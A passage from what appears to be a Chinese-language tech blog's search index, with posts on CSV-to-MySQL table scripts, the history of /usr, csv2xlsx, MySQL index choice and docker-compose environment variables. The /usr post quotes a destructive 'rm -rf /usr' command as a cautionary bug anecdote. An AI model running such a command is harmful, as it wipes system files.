Linux 文件双向实时同步 – Jacky’s Blog</a></li>\n<li><a href=\"https://blog.csdn.net/chunyuan314/article/details/81750211\" target=\"_blank\" rel=\"noopener\">PHP用inotify扩展监控文件_chunyuan314的博客-CSDN博客</a></li>\n<li><a href=\"https://man.linuxde.net/inotifywait\" target=\"_blank\" rel=\"noopener\">inotifywait命令_Linux inotifywait 命令用法详解：异步文件系统监控机制</a></li>\n<li><a href=\"http://silverd.cn/2015/07/06/blpop.html\" target=\"_blank\" rel=\"noopener\">Redis 阻塞、安全队列 BLPOP/BRPOPLPUSH - Silverd</a></li>\n<li><a href=\"https://skorks.com/2010/03/how-to-quickly-generate-a-large-file-on-the-command-line-with-linux/\" target=\"_blank\" rel=\"noopener\">How To Quickly Generate A Large File On The Command Line (With Linux) - Skorks</a></li>\n<li><a href=\"https://www.cnblogs.com/spareribs/p/7722453.html\" target=\"_blank\" rel=\"noopener\">inotify-tools + php脚本实现Linux服务器文件监控并邮件提醒 - 黄小涛 - 博客园</a></li>\n<li><a href=\"https://github.com/ktbyers/netmiko\" target=\"_blank\" rel=\"noopener\">ktbyers/netmiko: Multi-vendor library to simplify Paramiko SSH connections to network devices</a></li>\n<li><a href=\"https://www.itread01.com/content/1546932986.html\" target=\"_blank\" rel=\"noopener\">python獲取程式執行檔案路徑方法 - IT閱讀</a></li>\n</ul>\n","categories":["Linux"],"tags":["linux","cp"]},{"title":"csv 快速建立 MySQL 資料表方法","url":"/blog/2019/08/21/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/","content":"<p>通常 csv 匯入現有 table<br>我今天要建立 table<br><del>但我很懶(逃)</del><br>在 stackoverflow 找到非常簡單的方法</p>\n<a id=\"more\"></a>\n<p><a href=\"https://stackoverflow.com/questions/9998596/create-mysql-table-directly-from-csv-file-using-the-csv-storage-engine\" target=\"_blank\" rel=\"noopener\">database - Create mysql table directly from CSV file using the CSV Storage engine? - Stack Overflow</a><br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\"># pass in the file name as an argument: ./mktable filename.csv</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"create table <span class=\"variable\">$1</span> ( \"</span></span><br><span class=\"line\">head -1 <span class=\"variable\">$1</span> | sed -e <span class=\"string\">'s/,/ varchar(255),\\n/g'</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\" varchar(255) );\"</span></span><br></pre></td></tr></table></figure></p>\n<p>只要在 command line，參數打 csv 檔案名稱<br><code>sh xxx.sh xxx.csv</code><br>可以產生出 create table SQL</p>\n<h2 id=\"匯入-CSV\"><a href=\"#匯入-CSV\" class=\"headerlink\" title=\"匯入 CSV\"></a>匯入 CSV</h2><p>由於我是用 Dbeaver 匯入(不知道 phpmyadmin不讓我匯入)<br>有空再來補 SQL 要怎麼做<br><del>結束這回合</del><br>我遇到資料有換行的問題 Dbeaver 可以正常執行</p>\n<h2 id=\"CSV-當作-SQL-撈取方法\"><a href=\"#CSV-當作-SQL-撈取方法\" class=\"headerlink\" title=\"CSV 當作 SQL 撈取方法\"></a>CSV 當作 SQL 撈取方法</h2><p>最近在想取得 csv 如何快速當作 DB 查詢方法<br>發現 Dbeaver 可以使用這個方式<a href=\"https://justnumbersandthings.com/post/2018-06-12-dbeaver-import-csv/\" target=\"_blank\" rel=\"noopener\">Importing a CSV into a database using DBeaver | Just Numbers &amp; Things</a><br>只是建立連線(CSV)，選一個資料夾，裡面的 csv 會當成 table</p>\n<p>但手動組 SQL，由於不能設定主鍵，所以可能還需要而外建立table<br>這點有點可惜了，但我覺得還滿實用</p>\n<p><strong>須注意<code>\\&quot;</code>會導致查詢會有問題，建議先手動取代<code>\\&quot;</code>改別的符號</strong><br>不知道是不是bug??</p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"bug永存重點小記 - 為什麼/usr會有bin資料夾","url":"/blog/2018/11/14/bug%E6%B0%B8%E5%AD%98%E9%87%8D%E9%BB%9E%E5%B0%8F%E8%A8%98-%E7%82%BA%E4%BB%80%E9%BA%BC-usr%E6%9C%83%E6%9C%89bin%E8%B3%87%E6%96%99%E5%A4%BE/","content":"<p>回想當初，對/usr資料夾不太熟悉<br>有發現有些/usr/bin跟/bin<br>但不知道兩者差異<br>今天讀了<a href=\"http://jandan.net/2018/11/08/bug-feature.html\" target=\"_blank\" rel=\"noopener\">bug 永存</a><br><a href=\"/blog/2018/11/14/bug永存重點小記-為什麼-usr會有bin資料夾/1.png\" title=\"備份圖\">備份圖</a><br>裡面考古了一堆東西<br>有解除我心中的疑惑</p>\n<a id=\"more\"></a>\n<ol>\n<li>window不能用aux,com命名，就算有副檔名也不行<br>程序員大型考古活動。明白了原來CON, PRN, AUX, NUL, COM1~9, LPT1~9。這些文件名windows都不能命名<br>突然想到之前MySQL在window也不能設定table大小寫<br>看來應該是系統的缺陷</li>\n</ol>\n<ol start=\"2\">\n<li>為什麼 Linux 會有 /usr 這個文件夾?<br>如果有新手問你為什麼，你要很裝逼的告訴他：/usr 下面放的都是不會影響系統正常運行的，而根目錄下面的都是最重要的。當你做緊急維護的時候，可以沒有 /usr，但不能沒有根目錄。</li>\n</ol>\n<p>神說：要有區別。所以第一個盤就用來放根目錄，作為開發系統用，而第二個硬盤就用來放用戶的東西，然後掛載到 /usr下面。用戶目錄下面就放的都是小東西，所以那可是 2.5 MB 近乎無限的空間啊(大霧)</p>\n<p>神說：我x！第一塊盤滿了！作為一個積極開發的系統， 肯定會生成大量的二進制文件，而各種 debug 的工具更是龐大無比。再買一塊 RK05 是可以的，就是沒錢而已。而似乎用戶目錄 /usr 不是很滿……</p>\n<p>神說：複製黏貼是神聖的。所以他們就把整個系統文件架構都複製了一份，黏貼到 /usr 下面， 所以就有了 /usr/bin, /usr/lib。但是哪些文件要移過來呢？肯定是那些不會影響系統啟動的啊，因為首先要啟動系統，然後再把 /usr 掛載到根目錄下面。</p>\n<p>神說：就這麼定了。於是直到 Ubuntu(一個流行的Linux)的最新版本 18.10，你系統裡面會有 /bin 和 /usr/bin，就是因為 45 年前<strong>兩個極客買不起 2.5 MB 硬盤做出的決定</strong>。</p>\n<p>這個太有趣啦XDD</p>\n<ol start=\"3\">\n<li>下面 撒旦的報復<br>神說： /usr 不重要。撒旦說：呵！<br>隨著 Linux 的發展，大部分的軟件都放在 /usr 下面了。當然，都是一些不會影響系統啟動的程序；但是對於用戶來說，/usr的程序更好玩，更重要，例如 firefox (瀏覽器），utorrent（下載器），mpv （播放器）， firefox（賢者模式煎蛋器）……<br>2014 年 bumblebee 作為一個 Linux 支持 Nvidia 顯卡的一個牛逼模式的軟件，向世人展示了什麼就「不重要」。在他們的安裝腳本中，不小心多寫一個空格，從<br>「<code>rm -rf /usr/lib/nvidia-current/xorg/xorg\n「</code><br>變成了<br>「<code>rm -rf /usr /lib/nvidia-current/xorg/xorg\n「</code><br>是不是你也沒看出來是什麼問題？就是在/usr 後多了一個空格，所以從刪除 /usr/lib/nvidia-current/xorg/xorg 變成了 刪除 /usr 和/lib/nvidia-current/xorg/xorg 兩個文件夾。<br>整個/usr被刪除了，哀鴻遍野…… rm 作為 Linux 的殺器，是無法恢復的。煎蛋器就這麼不見了……</li>\n</ol>\n<p>這個也很有趣，但我相信發生在自己身上一定是悲劇orz</p>\n","categories":["程式心法"],"tags":["window"]},{"title":"csv2xlsx CSV 轉 Excel 方法","url":"/blog/2019/08/26/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/","content":"<p>最近查詢報表<br>用 SQL 查詢 MySQL 資料，產生出 csv 檔案<br>但是在 Excel 直接打開會是亂碼，因為 DB 存放資料是 UTF-8<br>這個很簡單，使用 Notepad++ 或 vscode 改編碼就可以解決這個問題<br>改 Big5 裡面的韓語、日語就會變亂碼<br>其實可以手動到 Excel 匯入<br>我覺得需要有快速執行工具，就找找現成的 :P</p>\n<a id=\"more\"></a>\n<h2 id=\"tealeg-csv2xlsx\"><a href=\"#tealeg-csv2xlsx\" class=\"headerlink\" title=\"tealeg/csv2xlsx\"></a>tealeg/csv2xlsx</h2><p>找了這麼多版，終於找到一款可以正常使用。<br><a href=\"https://github.com/tealeg/csv2xlsx\" target=\"_blank\" rel=\"noopener\">tealeg/csv2xlsx: A simple program to convert CSV files into XLSX files.</a></p>\n<h3 id=\"安裝方法\"><a href=\"#安裝方法\" class=\"headerlink\" title=\"安裝方法\"></a>安裝方法</h3><p>注意前面沒有<code>http</code><br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">go get github.com/tealeg/csv2xlsx</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">csv2xlsx -f=xxxx.csv -o=test.xlsx -d=,</span><br></pre></td></tr></table></figure>\n<h3 id=\"移除-golang-程式方法\"><a href=\"#移除-golang-程式方法\" class=\"headerlink\" title=\"移除 golang 程式方法\"></a>移除 golang 程式方法</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 看看會做哪些動作，程式安裝在哪裡</span></span><br><span class=\"line\">go clean -i -n github.com/google/acme </span><br><span class=\"line\"><span class=\"comment\">#移除程式</span></span><br><span class=\"line\">go clean -i github.com/google/acme</span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://blog.longwin.com.tw/2017/03/golang-get-%E6%8A%93%E5%8F%96%E7%9A%84%E5%A5%97%E4%BB%B6%E5%A6%82%E4%BD%95%E7%A7%BB%E9%99%A4/\" target=\"_blank\" rel=\"noopener\">Golang get 抓取的套件如何移除 | Tsung’s Blog</a></p>\n<h3 id=\"注意事項\"><a href=\"#注意事項\" class=\"headerlink\" title=\"注意事項\"></a>注意事項</h3><p>需使用 UTF-8 csv<br>產生 Excel 為 utf8<br>big5 會亂碼</p>\n<h2 id=\"其他的-csv2xlsx\"><a href=\"#其他的-csv2xlsx\" class=\"headerlink\" title=\"其他的 csv2xlsx\"></a>其他的 csv2xlsx</h2><h3 id=\"bash-指令方法\"><a href=\"#bash-指令方法\" class=\"headerlink\" title=\"bash 指令方法\"></a>bash 指令方法</h3><p>SSConvert </p>\n<p>unoconv </p>\n<p>但好像都是 Linux ，所以我就沒有嘗試</p>\n<p><a href=\"https://unix.stackexchange.com/questions/158254/convert-csv-to-xls-file-on-linux\" target=\"_blank\" rel=\"noopener\">bash - convert CSV to XLS file on linux - Unix &amp; Linux Stack Exchange</a></p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><ul>\n<li><a href=\"https://github.com/mentax/csv2xlsx\" target=\"_blank\" rel=\"noopener\">mentax/csv2xlsx: Fast and simple opensource command line tool to convert CSV do XLSX</a></li>\n<li><a href=\"https://gitlab.com/DerLinkshaender/csv2xlsx\" target=\"_blank\" rel=\"noopener\">Armin / csv2xlsx · GitLab</a></li>\n<li><a href=\"https://pypi.org/project/csv2xlsx/\" target=\"_blank\" rel=\"noopener\">csv2xlsx · PyPI</a></li>\n<li><a href=\"https://github.com/kyoh86/csv2xlsx\" target=\"_blank\" rel=\"noopener\">kyoh86/csv2xlsx</a></li>\n<li><a href=\"https://github.com/truesocialmetrics/service-file-format-convertor-csv2xlsx\" target=\"_blank\" rel=\"noopener\">truesocialmetrics/service-file-format-convertor-csv2xlsx: convert files from csv to excel</a></li>\n<li><a href=\"https://blog.longwin.com.tw/2017/03/golang-get-%E6%8A%93%E5%8F%96%E7%9A%84%E5%A5%97%E4%BB%B6%E5%A6%82%E4%BD%95%E7%A7%BB%E9%99%A4/\" target=\"_blank\" rel=\"noopener\">Golang get 抓取的套件如何移除 | Tsung’s Blog</a></li>\n</ul>\n<p><strong>2020-01-30</strong></p>\n<p>在想都有 csv2xlsx 應該有 xlsx2csv 吧<br>同一個作者有出<a href=\"https://github.com/tealeg/xlsx2csv\" target=\"_blank\" rel=\"noopener\">tealeg/xlsx2csv: Convert XSLX files to CSV</a></p>\n<h2 id=\"安裝\"><a href=\"#安裝\" class=\"headerlink\" title=\"安裝\"></a>安裝</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">go get github.com/tealeg/xlsx2csv</span><br></pre></td></tr></table></figure>\n<h2 id=\"指令\"><a href=\"#指令\" class=\"headerlink\" title=\"指令\"></a>指令</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">xlsx2csv.exe -o testfile.csv testfile.xlsx</span><br></pre></td></tr></table></figure>\n","categories":["實用工具"],"tags":["csv","xlsx"]},{"title":"date在查詢大量資料沒吃到index","url":"/blog/2018/12/24/date%E5%9C%A8%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%B2%92%E5%90%83%E5%88%B0index/","content":"<p>最近做時間查詢一個月資料<br>但是盡然沒有吃到 index<br>我抓一天、兩天資料都有吃到<br>抓到超過 20 天竟然就吃不到<br>覺得這個問題好像滿嚴重</p>\n<a id=\"more\"></a>\n<h2 id=\"大量資料吃-index-未必是壞事\"><a href=\"#大量資料吃-index-未必是壞事\" class=\"headerlink\" title=\"大量資料吃 index 未必是壞事\"></a>大量資料吃 index 未必是壞事</h2><p>記得之前去聽一個研討會<br>當欄位資料別少的時候(姓別：男、女)<br>但大量資料，資料分散造成讀取不是連續的<br>會造今資料不會很快<br>所以這時候 full scan 不是壞事</p>\n<p>但今過爬文找到<a href=\"https://www.ptt.cc/bbs/Database/M.1379428749.A.7E8.html\" target=\"_blank\" rel=\"noopener\">Re: [SQL ] mysql date column index 問題 - 看板 Database - 批踢踢實業坊</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">首先你要知道 INDEX 是另外存的 也佔空間 也吃 FILE IO</span><br><span class=\"line\">也就是說 透過 INDEX 其實不一定比較快</span><br><span class=\"line\">例如你有一個 TABLE 總共佔了 10000 個 block</span><br><span class=\"line\">然後建了一個 index , 這個 index 本身佔了 2000 個 block</span><br><span class=\"line\">假設你今天要找的資料 在整個 table 的 10000 個 blocks 裡，</span><br><span class=\"line\">散布在其中的 9000 個 blocks 裡面。</span><br><span class=\"line\"></span><br><span class=\"line\">這時候  你透過 index 找資料的 IO 成本就會是 2000 + 9000 = 11000</span><br><span class=\"line\">而 Full Table Scan 的 IO 成本只有 10000</span><br><span class=\"line\">像這樣的時候， DBMS 就會選擇直接做 Table Scan 因為成本比較低。</span><br><span class=\"line\">那 DBMS 怎麼知道哪條路成本比較低呢</span><br><span class=\"line\">就來自它本身對這些 表格/索引 的統計值</span><br><span class=\"line\"></span><br><span class=\"line\">以 Oracle 舉例  跟這樣行為有關的參數就包括有</span><br><span class=\"line\">1. 最佳化器嘗試組出最佳路徑的嘗試次數上限</span><br><span class=\"line\">2. 最佳化器判斷 走 index 的成本 大於 Full Table Scan 成本的多少比例以上</span><br><span class=\"line\">   就走 Full Scan</span><br><span class=\"line\">3. 最佳化器優化的方向(最小IO , 最快回應等</span><br><span class=\"line\">回到你提的問題</span><br><span class=\"line\">從你下的參數中我們可以注意到幾件事</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1. 在你指定的範圍內資料量較小的時候 DBMS 會覺得該走 index</span><br><span class=\"line\"></span><br><span class=\"line\">2. 在你指定的範圍內資料量較大的時候 DBMS 選擇走 FULL SCAN</span><br><span class=\"line\"></span><br><span class=\"line\">3. 你下了 select * 這代表所有不在INDEX上的欄位，DBMS都必須要翻</span><br><span class=\"line\">   DATA BLOCKS出來才能拿到資料</span><br><span class=\"line\"></span><br><span class=\"line\">但是在你的資料中  0000-00-00  的資料量到底有多少？</span><br><span class=\"line\"></span><br><span class=\"line\">如果只有很小一點點 (或是 DBMS 覺得它只佔一點點</span><br><span class=\"line\"></span><br><span class=\"line\">那麼使用 FULL SCAN 是很正常的。</span><br><span class=\"line\"></span><br><span class=\"line\">反正你都得翻這些資料出來，何必脫褲子放屁去 index blocks 再繞一圈呢？</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">但是如果 這樣的資料是佔多數的</span><br><span class=\"line\"></span><br><span class=\"line\">那或許是你的表格/索引的統計值出問題了。導致 DBMS 覺得這樣比較快</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">* 有另一個狀況 就是  DBMS 在處理 function(col) 這些操作的時候</span><br><span class=\"line\">  因為存在 index 裡的資料是 col 而非 function(col)</span><br><span class=\"line\">  所以 DBMS 會覺得這個 index 是與需求不符的 會放棄</span><br><span class=\"line\"></span><br><span class=\"line\">** 然後 資料量大的話 會慢是正常的啊 有吃 IO 吃CPU 就有開銷就是要花工夫啊</span><br><span class=\"line\">   你只能避免它繞冤枉路 該走的路還是免不了的</span><br></pre></td></tr></table></figure>\n<p>其實 MySQL 被評效能不好，不過看樣子是 DB 選擇最佳方案<br>看到這個就讓他放手去做 full scan<br>不然就做大數據 XD(其實我不會)</p>\n<img src=\"/blog/2018/12/24/date在查詢大量資料沒吃到index/1.jpg\">\n<img src=\"/blog/2018/12/24/date在查詢大量資料沒吃到index/2.jpg\">\n<h2 id=\"強制做-index-查詢\"><a href=\"#強制做-index-查詢\" class=\"headerlink\" title=\"強制做 index 查詢\"></a>強制做 index 查詢</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select count(*) from http_log_3 force index(time) where time &gt;= 000000</span><br></pre></td></tr></table></figure>\n<p><strong>注意</strong> 這邊的 index(<code>index名字</code>)<br>如我上面圖片要寫成 : force index(<code>idx_date</code>)</p>\n<p>這邊有範例<a href=\"https://et3w503.wordpress.com/2008/12/02/%E9%80%9A%E9%81%8Eforce-index%E4%BA%86%E8%A7%A3%E7%9A%84mysql%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%80%A7%E8%83%BD%E5%84%AA%E5%8C%96/\" target=\"_blank\" rel=\"noopener\">通過 force index 了解的 MySQL 查詢的性能優化 | 不分享空間</a><br>可以看到跑出來結果差很多<br>所以我們還是要相信 MySQL XDD</p>\n<p><a href=\"https://jef.iteye.com/blog/386907\" target=\"_blank\" rel=\"noopener\">Mysql 的强制索引（Force Index）都为我们做了哪些优化？ - 愿今日的一切困难在未来都不值一提 - ITeye 博客</a></p>\n<p>其他問題小記<br><a href=\"http://carlislebear.blogspot.com/2013/06/mysql.html\" target=\"_blank\" rel=\"noopener\">老天尊的死期: MySQL 常見問題</a><br><a href=\"https://sayue.me/2017/06/11/mysql%E7%9A%84process%E5%A0%B5%E5%A1%9E%E5%A4%84%E7%90%86/\" target=\"_blank\" rel=\"noopener\">mysql 的 process 堵塞处理 | Sayue’s Blog</a></p>\n","categories":["MySQL"],"tags":["sql","index"]},{"title":"docker-compose 的環境變數設定","url":"/blog/2021/06/02/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/","content":"<p><a href=\"https://www.cnblogs.com/sparkdev/p/9826520.html\" target=\"_blank\" rel=\"noopener\">Docker Compose 引用环境变量 - sparkdev - 博客园</a></p>\n<p>之前用 docker-compose 都不知道可以抓環境變數<br>甚至 .env 也可以抓到<br>某天看到這個方法<br>今天來整理一下，不確定是哪個版本才有這個功能</p>\n<a id=\"more\"></a>\n<h2 id=\"Bash-環境變數\"><a href=\"#Bash-環境變數\" class=\"headerlink\" title=\"Bash 環境變數\"></a>Bash 環境變數</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> IMAGETAG=httpd</span><br></pre></td></tr></table></figure>\n<p>windows posershell 不知道要怎麼抓<br>但先不研究</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'3'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  web:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">$&#123;IMAGETAG&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">     -</span> <span class=\"string\">\"80:80\"</span></span><br><span class=\"line\"><span class=\"attr\">  redis:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">\"redis:alpine\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"預設環境變數\"><a href=\"#預設環境變數\" class=\"headerlink\" title=\"預設環境變數\"></a>預設環境變數</h3><p>重新開新的bash</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'3'</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  web:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">$&#123;IMAGETAG:-nginx&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">     -</span> <span class=\"string\">\"80:80\"</span></span><br><span class=\"line\"><span class=\"attr\">  redis:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">\"redis:alpine\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"環境變數傳給容器\"><a href=\"#環境變數傳給容器\" class=\"headerlink\" title=\"環境變數傳給容器\"></a>環境變數傳給容器</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">web:</span></span><br><span class=\"line\"><span class=\"attr\">  environment:</span></span><br><span class=\"line\"><span class=\"attr\">    DEBUG:</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>同等於<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -e DEBUG=1 ubuntu bash</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -e DEBUG=1 ubuntu bash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$DEBUG</span></span><br><span class=\"line\"><span class=\"comment\">#1</span></span><br></pre></td></tr></table></figure>\n<p>沒有設定 1 會為 null<br>請參考如下</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">web:</span></span><br><span class=\"line\"><span class=\"attr\">  environment:</span></span><br><span class=\"line\"><span class=\"attr\">    DEBUG:</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://i.imgur.com/oFP350e.png\" alt=\"\"></p>\n<p>再 Linux 設定 DEBUG 環境變數為 1</p>\n<p><img src=\"https://i.imgur.com/vNoQqee.png\" alt=\"\"></p>\n<h2 id=\"env\"><a href=\"#env\" class=\"headerlink\" title=\".env\"></a>.env</h2><p>參考: <a href=\"https://docs.docker.com/compose/environment-variables/\" target=\"_blank\" rel=\"noopener\">Environment variables in Compose | Docker Documentation</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ cat .env</span><br><span class=\"line\">TAG=v1.5</span><br><span class=\"line\"></span><br><span class=\"line\">$ cat docker-compose.yml</span><br><span class=\"line\">version: &apos;3&apos;</span><br><span class=\"line\">services:</span><br><span class=\"line\">  web:</span><br><span class=\"line\">    image: &quot;webapp:$&#123;TAG&#125;&quot;</span><br><span class=\"line\">$ docker-compose config</span><br><span class=\"line\"></span><br><span class=\"line\">version: &apos;3&apos;</span><br><span class=\"line\">services:</span><br><span class=\"line\">  web:</span><br><span class=\"line\">    image: &apos;webapp:v1.5&apos;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"設定檔案為容器多個環境變數\"><a href=\"#設定檔案為容器多個環境變數\" class=\"headerlink\" title=\"設定檔案為容器多個環境變數\"></a>設定檔案為容器多個環境變數</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ cat .env</span><br><span class=\"line\">TAG=v1.5</span><br><span class=\"line\"></span><br><span class=\"line\">$ cat ./config/.env.dev</span><br><span class=\"line\">TAG=v1.6</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$ cat docker-compose.yml</span><br><span class=\"line\">version: &apos;3&apos;</span><br><span class=\"line\">services:</span><br><span class=\"line\">  web:</span><br><span class=\"line\">    image: &quot;webapp:$&#123;TAG&#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$ docker-compose config </span><br><span class=\"line\">version: &apos;3&apos;</span><br><span class=\"line\">services:</span><br><span class=\"line\">  web:</span><br><span class=\"line\">    image: &apos;webapp:v1.5&apos;</span><br><span class=\"line\">    </span><br><span class=\"line\">$ docker-compose --env-file ./config/.env.dev config </span><br><span class=\"line\">version: &apos;3&apos;</span><br><span class=\"line\">services:</span><br><span class=\"line\">  web:</span><br><span class=\"line\">    image: &apos;webapp:v1.6&apos;</span><br></pre></td></tr></table></figure>\n<p>最下面同等於 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --env-file=./config/.env.dev</span><br></pre></td></tr></table></figure>\n<h2 id=\"環境變數使用順序\"><a href=\"#環境變數使用順序\" class=\"headerlink\" title=\"環境變數使用順序\"></a>環境變數使用順序</h2><ol>\n<li>Compose file</li>\n<li>Shell environment variables</li>\n<li>Environment file</li>\n<li>Dockerfile</li>\n<li>Variable is not defined</li>\n</ol>\n<blockquote>\n<p>首先，在 docker-compose.yml 文件中直接設置的值優先級是最高的。<br>然後是在當前 shell 中 export 的環境變量值。<br>接下來是在環境變量文件中定義的值。<br>再接下來是在 Dockerfile 中定義的值。<br>最後還沒有找到相關的環境變量就認為該環境變量沒有被定義。</p>\n</blockquote>\n<h2 id=\"依照環境變數建置測試-正式環境\"><a href=\"#依照環境變數建置測試-正式環境\" class=\"headerlink\" title=\"依照環境變數建置測試/正式環境\"></a>依照環境變數建置測試/正式環境</h2><p>參考: <a href=\"https://www.cnblogs.com/sparkdev/p/9826520.html\" target=\"_blank\" rel=\"noopener\">Docker Compose 引用環境變量 - sparkdev - 博客園</a></p>\n<p>test.sh<br><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> define env var default value.</span></span><br><span class=\"line\">export IMAGETAG=web:v1</span><br><span class=\"line\">export APPNAME=HelloWorld</span><br><span class=\"line\">export AUTHOR=Nick Li</span><br><span class=\"line\">export VERSION=1.0</span><br></pre></td></tr></table></figure></p>\n<p>prod.sh<br><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> define env var default value.</span></span><br><span class=\"line\">export IMAGETAG=webpord:v1</span><br><span class=\"line\">export APPNAME=HelloWorldProd</span><br><span class=\"line\">export AUTHOR=Nick Li</span><br><span class=\"line\">export VERSION=1.0LTS</span><br></pre></td></tr></table></figure></p>\n<p>可依照 shell 環境變數建立不同環境<br>還算滿方便的方法</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"> source test.sh</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> docker-compose config</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> <span class=\"built_in\">source</span> prod.sh</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> docker-compose config</span></span><br></pre></td></tr></table></figure>","categories":["Docker"],"tags":["docker"]},{"title":"docker swarm 一些指令相關整理","url":"/blog/2019/12/07/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/","content":"<h2 id=\"基本教學網站\"><a href=\"#基本教學網站\" class=\"headerlink\" title=\"基本教學網站\"></a>基本教學網站</h2><p><a href=\"https://github.com/twtrubiks/docker-swarm-tutorial\" target=\"_blank\" rel=\"noopener\">twtrubiks/docker-swarm-tutorial: Docker Swarm 基本教學 - 從無到有 Docker-Swarm-Beginners-Guide📝</a></p>\n<p><a href=\"https://outmanzzq.github.io/2019/06/18/docker-swarm-manager-ha/\" target=\"_blank\" rel=\"noopener\">Docker Swarm 管理节点高可用分析 — outmanzzq</a></p>\n<p>由於上面網站都教的非常清楚<br>我這邊只記錄如何操作跟小筆記(或我覺得重要的)<br>不會詳細介紹，我覺得以上都說得很細</p>\n<a id=\"more\"></a>\n<h3 id=\"managers\"><a href=\"#managers\" class=\"headerlink\" title=\"managers\"></a>managers</h3><p>後續有相關指令 managers 才可以執行 (EX: docker service, docker node)<br>之後下的指令是要在 manager 用</p>\n<h3 id=\"worker\"><a href=\"#worker\" class=\"headerlink\" title=\"worker\"></a>worker</h3><p>manager 會分配 task 給 work 用</p>\n<h2 id=\"基本連線\"><a href=\"#基本連線\" class=\"headerlink\" title=\"基本連線\"></a>基本連線</h2><p>要如何加入 manger 或 worker 呢?</p>\n<p>其實只要看<br><code>docker swarm join-token manager</code><br>或<br><code>docker swarm join-token worker</code><br>就能看到要加入 manager / worker 指令</p>\n<h2 id=\"docker-node\"><a href=\"#docker-node\" class=\"headerlink\" 